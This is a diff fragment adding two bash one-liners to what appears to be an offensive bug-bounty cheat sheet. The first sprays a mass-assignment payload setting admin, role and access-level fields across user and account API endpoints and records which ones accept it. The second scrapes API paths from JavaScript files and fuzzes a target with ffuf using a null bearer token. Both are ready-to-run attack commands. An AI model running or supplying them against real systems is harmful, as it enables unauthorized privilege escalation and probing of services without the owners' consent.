+cat api_endpoints.txt | grep -iE "(user|account|profile|register|signup|update)" | xargs -I@ curl -s -X POST @ -H "Content-Type: application/json" -d '{"admin":true,"role":"admin","isAdmin":true,"is_admin":1,"privilege":"admin","access_level":9999}' -o /dev/null -w "%{http_code} - @\n" | grep -E "^(200|201|204)" | anew mass_assignment.txt
+```
+
+### 💀 API FUZZ with Custom Wordlist Generation
+```bash
+# ☠️ Generate API wordlist from JS files and fuzz
+cat js.txt | xargs -I@ curl -s @ | grep -oE "[\"\']/(api|v[0-9])/[a-zA-Z0-9/_-]+[\"\']" | tr -d "\"'" | sort -u > custom_api_wordlist.txt && ffuf -u https://target.com/FUZZ -w custom_api_wordlist.txt -mc 200,201,204,401,403,500 -ac -c -t 80 -H "Authorization: Bearer null" -o custom_api_fuzz.json
 ```
 
 ---
